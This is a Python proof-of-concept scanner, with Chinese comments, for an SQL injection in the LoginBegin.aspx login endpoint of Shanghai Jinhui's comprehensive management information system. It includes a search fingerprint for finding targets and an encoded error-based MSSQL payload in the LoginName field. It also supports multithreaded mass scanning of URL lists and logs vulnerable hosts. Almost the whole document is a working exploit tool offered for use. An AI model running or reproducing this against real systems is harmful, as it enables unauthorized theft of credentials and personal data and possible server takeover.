# -*- coding: utf-8 -*-
# 金慧-综合管理信息系统 LoginBegin.aspx SQL注入漏洞
# body="/Portal/LoginBegin.aspx"
# 产品简介:金慧-综合管理信息系统（以下简称“金慧综合管理系统”）是上海金慧软件有限公司基于多年行业系统研发和实施经验，为各类企业量身定制的一套综合性管理解决方案。该系统旨在通过信息化手段，提升企业的管理效率，优化资源配置，实现办公自动化和无纸化办公。系统集成了企业日常办公、项目管理、财务管理、人力资源管理等多个方面的功能，通过统一的平台实现数据的共享和流程的协同。该系统以用户需求为导向，结合行业最佳实践，为企业提供了一套高效、灵活、易用的管理工具。
# 漏洞概述:由于金慧-综合管理信息系统 LoginBegin.aspx（登录接口处）没有对外部输入的SQL语句进行严格的校验和过滤，直接带入数据库执行，导致未经身份验证的远程攻击者可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def bunner():
    test = """                                                            
        \x1b[38m     ██╗██╗  ██╗      ███████╗ ██████╗ ██╗     
        \x1b[36m     ██║██║  ██║      ██╔════╝██╔═══██╗██║     
        \x1b[34m     ██║███████║█████╗███████╗██║   ██║██║     
        \x1b[35m██   ██║██╔══██║╚════╝╚════██║██║▄▄ ██║██║     
        \x1b[31m╚█████╔╝██║  ██║      ███████║╚██████╔╝███████╗
        \x1b[33m ╚════╝ ╚═╝  ╚═╝      ╚══════╝ ╚══▀▀═╝ ╚══════╝                                               
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>                                       
  --author:Kucei  --Vession:金慧-综合管理信息系统 LoginBegin.aspx SQL注入                                                                                                          
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    bunner()
    # 初始化
    parser = argparse.ArgumentParser("金慧-综合管理信息系统_LoginBegin.aspx_SQL注入")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 创建一个列表接收 文件夹的URL
        url_list = []
        with open(args.file,'r') as fp:
            # 遍历文件夹内的URL
            for url in fp.readlines():
                # append 往列表添加元素
                url_list.append(url.strip())
        # 创建线性池
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else :
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = "/Portal/LoginBegin.aspx?ReturnUrl=%2f"
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
    }
    data = 'Todo=Validate&LoginName=1%27+AND+5094+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%285094%3D5094%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29+AND+%27JKJg%27%3D%27JKJg&Password=&CDomain=Local&FromUrl='
    try :
        response1 = requests.post(url=target+url_payload,headers=headers,data=data,verify=False,timeout=7)
        if response1.status_code == 200 and 'qbpxq1qkvxq' in response1.text:
            print( f"[+] {target} 存在漏洞！\n")
            with open('金慧-综合管理信息系统_SQL.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")

if __name__ == '__main__':
    main()